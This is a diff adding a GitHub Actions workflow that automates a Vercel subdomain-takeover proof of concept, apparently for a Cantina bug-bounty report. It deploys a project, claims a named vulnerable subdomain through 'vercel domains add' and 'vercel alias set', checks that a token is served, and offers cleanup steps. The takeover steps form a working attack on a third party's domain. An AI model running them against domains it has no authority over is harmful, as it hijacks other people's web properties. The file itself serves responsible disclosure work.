@@ -1,0 +1,185 @@
+name: Vercel PoC deploy and verify
+
+on:
+  workflow_dispatch:
+    inputs:
+      domain:
+        description: 'Vulnerable subdomain to claim (e.g., api.minitel.app)'
+        required: true
+        type: string
+      scope:
+        description: 'Vercel team/user scope (slug), optional'
+        required: false
+        type: string
+      cleanup_detach:
+        description: 'Detach the alias after verification (non-defacing)'
+        required: false
+        default: true
+        type: boolean
+      cleanup_delete_project:
+        description: 'Delete the temporary Vercel project after run (use with caution)'
+        required: false
+        default: false
+        type: boolean
+
+env:
+  POC_DIR: tools/takeover_poc
+  TOKEN: CANTINA-POC-VERCEL-DEPLOYMENT-NOT-FOUND-5f2b7a4e
+
+jobs:
+  deploy-verify:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      id-token: write
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Setup Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: 20
+
+      - name: Install Vercel CLI
+        run: npm i -g vercel@latest
+
+      - name: Vercel version
+        run: vercel --version
+
+      - name: Deploy PoC to Vercel
+        id: deploy
+        env:
+          VERCEL_TOKEN: ${{ secrets.VERCEL_TOKEN }}
+          VERCEL_SCOPE: ${{ inputs.scope }}
+        run: |
+          set -euo pipefail
+          if [ -z "${VERCEL_TOKEN:-}" ]; then
+            echo "Missing required secret: VERCEL_TOKEN" >&2
+            exit 1
+          fi
+          cd "$POC_DIR"
+          SCOPE_ARG=""
+          if [ -n "${VERCEL_SCOPE:-}" ]; then SCOPE_ARG="--scope $VERCEL_SCOPE"; fi
+          # Avoid interactive prompts by pre-creating .vercel config
+          vercel pull --yes --environment=production --token "$VERCEL_TOKEN" $SCOPE_ARG || true
+          # Deploy to production
+          out=$(vercel deploy --prod --yes --token "$VERCEL_TOKEN" $SCOPE_ARG)
+          echo "$out" | sed -n '1,120p'
+          url=$(echo "$out" | grep -Eo 'https://[a-zA-Z0-9.-]+\.vercel\.app' | tail -n1 || true)
+          if [ -z "${url:-}" ]; then
+            echo "Failed to capture deployment URL from Vercel CLI output" >&2
+            exit 1
+          fi
+          echo "Deployment URL: $url"
+          echo "url=$url" >> "$GITHUB_OUTPUT"
+
+      - name: Attach alias to vulnerable domain
+        # Add domain to the Vercel account/team first (no-op if already added), then alias to the deployment
+        id: alias
+        env:
+          VERCEL_TOKEN: ${{ secrets.VERCEL_TOKEN }}
+          VERCEL_SCOPE: ${{ inputs.scope }}
+          DEPLOY_URL: ${{ steps.deploy.outputs.url }}
+        run: |
+          set -euo pipefail
+          SCOPE_ARG=""
+          if [ -n "${VERCEL_SCOPE:-}" ]; then SCOPE_ARG="--scope $VERCEL_SCOPE"; fi
+          # Ensure domain is registered in the account/team (ignore if exists)
+          vercel domains add "${{ inputs.domain }}" --token "$VERCEL_TOKEN" $SCOPE_ARG || true
+          echo "Aliasing $DEPLOY_URL -> ${{ inputs.domain }}"
+          vercel alias set "$DEPLOY_URL" "${{ inputs.domain }}" --token "$VERCEL_TOKEN" $SCOPE_ARG
+          echo "alias=${{ inputs.domain }}" >> "$GITHUB_OUTPUT"
+
+      - name: Verify token over HTTPS
+        id: verify
+        run: |
+          set -euo pipefail
+          mkdir -p artifacts
+          domain="${{ inputs.domain }}"
+          token="$TOKEN"
+          # Control host headers (optional context)
+          curl -s -D artifacts/control_headers.txt https://www.minitel.app -o /dev/null || true
+          # Candidate root headers/body
+          curl -s -D artifacts/root_headers.txt "https://${domain}" -o artifacts/root_body.txt || true
+
+          # Retry loop to account for edge propagation
+          found=0
+          for i in $(seq 1 10); do
+            curl -s -D artifacts/token_headers.txt "https://${domain}/.well-known/cantina-verification.txt" -o artifacts/token_body.txt || true
+            code_txt=$(head -n1 artifacts/token_headers.txt | awk '{print $2}' || true)
+            if grep -xq "$token" artifacts/token_body.txt; then found=1; break; fi
+            curl -s -D artifacts/html_headers.txt "https://${domain}/poc.html" -o artifacts/html_body.txt || true
+            code_html=$(head -n1 artifacts/html_headers.txt | awk '{print $2}' || true)
+            if grep -q "$token" artifacts/html_body.txt; then found=1; break; fi
+            echo "Attempt $i/10: token not visible yet, waiting..."
+            sleep 6
+          done
+          if [ "$found" -ne 1 ]; then
+            echo "Token not found in /.well-known or /poc.html after retries" >&2
+            echo "PASS=false" >> "$GITHUB_OUTPUT"
+            exit 1
+          fi
+          # Enforce 200 status on at least one endpoint
+          ok200=0
+          code_txt=$(head -n1 artifacts/token_headers.txt | awk '{print $2}' || true)
+          code_html=$(head -n1 artifacts/html_headers.txt | awk '{print $2}' || true)
+          if [ "${code_txt:-}" = "200" ] || [ "${code_html:-}" = "200" ]; then ok200=1; fi
+          if [ $ok200 -ne 1 ]; then
+            echo "Token found but did not observe HTTP 200; headers follow:" >&2
+            head -n1 artifacts/token_headers.txt || true
+            head -n1 artifacts/html_headers.txt || true
+            echo "PASS=false" >> "$GITHUB_OUTPUT"
+            exit 1
+          fi
+          echo "PASS=true" >> "$GITHUB_OUTPUT"
+          echo "=== root headers ===" && head -n 20 artifacts/root_headers.txt || true
+          echo "=== token check passed ==="
+
+      - name: Upload verification artifacts
+        uses: actions/upload-artifact@v4
+        with:
+          name: vercel-poc-${{ inputs.domain }}
+          path: artifacts/
+
+      - name: Job summary (copy/paste for triager)
+        if: always()
+        run: |
+          domain='${{ inputs.domain }}'
+          token='${{ env.TOKEN }}'
+          {
+            echo "## PoC ready"
+            echo
+            echo "- URL: https://${domain}/poc.html"
+            echo "- Token: ${token}"
+            echo "- Verify (HTML): \n\n\tcurl -sS https://${domain}/poc.html | grep -q '${token}' && echo PASS || echo FAIL\n"
+            echo "- Verify (TXT): \n\n\tcurl -sS https://${domain}/.well-known/cantina-verification.txt | grep -x '${token}' && echo PASS || echo FAIL\n"
+            echo "- Cleanup: relancez ce workflow avec cleanup_detach=true ou utilisez le workflow 'Vercel Detach Alias'"
+          } >> "$GITHUB_STEP_SUMMARY"
+
+      - name: Detach alias (cleanup)
+        if: ${{ inputs.cleanup_detach }}
+        env:
+          VERCEL_TOKEN: ${{ secrets.VERCEL_TOKEN }}
+          VERCEL_SCOPE: ${{ inputs.scope }}
+        run: |
+          set -euo pipefail
+          SCOPE_ARG=""
+          if [ -n "${VERCEL_SCOPE:-}" ]; then SCOPE_ARG="--scope $VERCEL_SCOPE"; fi
+          vercel alias rm "${{ inputs.domain }}" --yes --token "$VERCEL_TOKEN" $SCOPE_ARG \
+            || vercel alias remove "${{ inputs.domain }}" --yes --token "$VERCEL_TOKEN" $SCOPE_ARG \
+            || true
+
+      - name: Delete project (optional)
+        if: ${{ inputs.cleanup_delete_project }}
+        env:
+          VERCEL_TOKEN: ${{ secrets.VERCEL_TOKEN }}
+          VERCEL_SCOPE: ${{ inputs.scope }}
+        run: |
+          set -euo pipefail
+          SCOPE_ARG=""
+          if [ -n "${VERCEL_SCOPE:-}" ]; then SCOPE_ARG="--scope $VERCEL_SCOPE"; fi
+          # Try to remove by project name (folder name as heuristic)
+          proj="$(basename "$POC_DIR")"
+          echo "Attempting to remove project: $proj"
+          vercel project remove "$proj" --yes --token "$VERCEL_TOKEN" $SCOPE_ARG || true
